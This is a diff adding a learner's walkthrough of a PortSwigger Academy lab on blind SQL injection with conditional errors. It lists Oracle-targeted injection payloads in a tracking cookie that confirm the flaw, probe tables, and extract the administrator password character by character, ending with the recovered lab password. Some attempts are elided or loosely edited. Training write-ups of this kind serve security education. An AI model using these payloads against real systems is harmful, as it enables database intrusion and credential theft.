@@ -1,0 +1,129 @@
+PortSwigger Academy Lab: Blind SQL injection with conditional errors
+
+*****Context*****
+⦁	Tracking cookie used for analytics.
+⦁	SQL query results are not returned.
+⦁	A Table called 'users' contains columns called 'username' and 'password'.
+
+*****Goal*****
+⦁	Determine the 'password' of the 'administrator' account and login.
+
+*****Checking whether the vulnerability exists*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'
+⦁	Output: Internal Server Error
+
+ATTEMPT-2
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs''
+⦁	Output: Ok
+
+Lesson Learned: A syntax error is taking place
+
+*****Checking if the server is performing input sanitization or not*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||SELECT ''||''
+⦁	Output: Internal Server Error
+
+ATTEMPT-2
+⦁	Input:TrackingId=J2dkMAbDzlMWdRVs'||SELECT '' FROM dual||''
+⦁	Output: Internal Server Error
+
+ATTEMPT-3
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT '' FROM dual)||''
+⦁	Output: Internal Server Error
+
+ATTEMPT-4
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT '' FROM dual)||'
+⦁	Output: Ok
+
+Lesson Learned: Input sanitization is not performed
+
+*****Check if errors are produced for a non-existent table*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT '' FROM non-existent)||'
+⦁	Output: Internal Server Error
+
+Lesson Learned: Errors are being produced
+
+*****Checking if a table called users exists*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT '' FROM users)||'
+⦁	Output: Internal Server Error
+⦁	Lesson Learned: We need to limit results to 1 row to prevent breaking the concatenation
+
+ATTEMPT-2
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT '' FROM users LIMIT 1)||'
+⦁	Output: Internal Server Error
+⦁	Lesson Learned: Since this is an Oracle database we can't use LIMIT 1
+
+ATTEMPT-3:
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT '' FROM users WHERE ROWNUM=1)||'
+⦁	Output: Ok
+
+Lesson Learned: Be aware of the type of database and a table called users exists.
+
+*****Checking whether I can trigger a condition usefully*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
+⦁	Output: Internal Server Error
+⦁	Lesson Learned: Condition has been triggered successfully for a true case
+
+ATTEMPT-2
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
+⦁	Output: Ok
+⦁	Lesson Learned: The condition has been successfully for false case as well
+
+*****Checking whether a user called administrator exists*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')||'
+⦁	Output: Internal Server Error
+⦁	Lesson Learned: The administrator user exists as an error has been generated
+
+*****Checking the length of the password for administrator account*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password)>1)||'
+⦁	Output: Internal Server Error
+
+ATTEMPT-2
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password)>2)||'
+⦁	Output: Internal Server Error
+
+ATTEMPT-3
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password)>3)||'
+⦁	Output: Internal Server Error
+.
+.
+.
+.
+.
+.
+ATTEMPT-20
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password)>20)||'
+⦁	Output: Ok
+⦁	Lesson Learned: The length of the password is 20 characters
+
+*****Determining the characters of the password*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')||'
+⦁	Output: n
+
+ATTEMPT-2
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')||'
+⦁	Output: n3
+.
+.
+.
+.
+.
+.
+ATTEMPT-20
+⦁	Input: TrackingId=J2dkMAbDzlMWdRVs'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')||'
+⦁	Output: n36xq65pht3u7lym6obn
